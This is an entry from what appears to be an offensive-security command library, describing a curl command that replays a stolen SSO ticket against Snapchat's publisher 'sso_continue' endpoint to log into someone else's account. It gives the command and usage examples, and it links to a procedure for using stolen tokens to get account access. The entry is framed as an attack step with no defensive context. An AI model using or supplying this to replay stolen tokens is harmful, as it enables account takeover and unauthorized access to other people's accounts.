---
data: 'curl ''https://snappublisher.snapchat.com/sso_continue?ticket=<stolen_token>'''
tags:
  - access
  - token
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 3ba942ab-f9d4-4222-bb6d-8ffc983619bd
created_at: '2025-12-13T09:01:26.622Z'
updated_at: '2025-12-13T09:01:26.622Z'
verified: false
validated: true
submitted: true
---
# Curl Access with Token

## Command

```bash
curl 'https://snappublisher.snapchat.com/sso_continue?ticket=<stolen_token>'
```

## Description

Uses a stolen token to access Snapchat's SSO continue endpoint for account login.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `ticket` | Stolen SSO token | Yes |

## Examples

### Basic Usage

```bash
curl 'https://snappublisher.snapchat.com/sso_continue?ticket=abc123'
```

### Advanced Usage

```bash
curl -v 'https://snappublisher.snapchat.com/sso_continue?ticket=abc123' -H 'Cookie: session'
```

## Expected Output

Successful login response.

## Related

- [[commands/curl-sso-request]]
- [[procedures/Use-Stolen-Token-for-Account-Access]]
